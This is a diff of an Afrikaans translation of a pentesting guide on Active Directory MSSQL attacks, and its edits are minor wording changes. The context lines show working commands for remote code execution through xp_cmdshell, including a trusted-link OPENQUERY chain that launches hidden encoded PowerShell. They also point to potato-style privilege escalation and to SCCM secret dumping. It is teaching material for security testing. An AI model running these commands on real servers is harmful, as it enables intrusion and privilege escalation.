@@ -161,7 +161,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-Dit mag ook moontlik wees om **opdragte** binne die MSSQL-gasheer uit te voer.
+Dit mag ook moontlik wees om **opdragte** binne die MSSQL gasheer uit te voer
 ```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
@@ -169,6 +169,7 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 Kontroleer in die bladsy genoem in die **volgende afdeling hoe om dit handmatig te doen.**
 
 ### MSSQL Basiese Hacking Trukke
+
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
@@ -256,7 +257,7 @@ select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 
 ![](<../../images/image (643).png>)
 
-Jy kan hierdie betroubare skakelketting handmatig vir ewig voortset.
+Jy kan hierdie vertroude skakelketting handmatig vir ewig voortset.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -283,7 +284,8 @@ Die **MSSQL plaaslike gebruiker** het gewoonlik 'n spesiale tipe voorreg genaamd
 [SweetPotato](https://github.com/CCob/SweetPotato) het 'n versameling van hierdie verskillende tegnieke wat uitgevoer kan word via Beacon se `execute-assembly` opdrag.
 
 ### SCCM Bestuurspunt NTLM Relay (OSD Geheimekstraksie)
-Sien hoe die standaard SQL rolle van SCCM **Bestuurspunte** misbruik kan word om Netwerk Toegang Rekening en Taak-Reeks geheime direk uit die webdatabasis te dump:
+Sien hoe die standaard SQL rolle van SCCM **Bestuurspunte** misbruik kan word om Netwerk Toegang Rekening en Taak-reeks geheime direk uit die webdatabasis te dump:
+
 {{#ref}}
 sccm-management-point-relay-sql-policy-secrets.md
 {{#endref}}
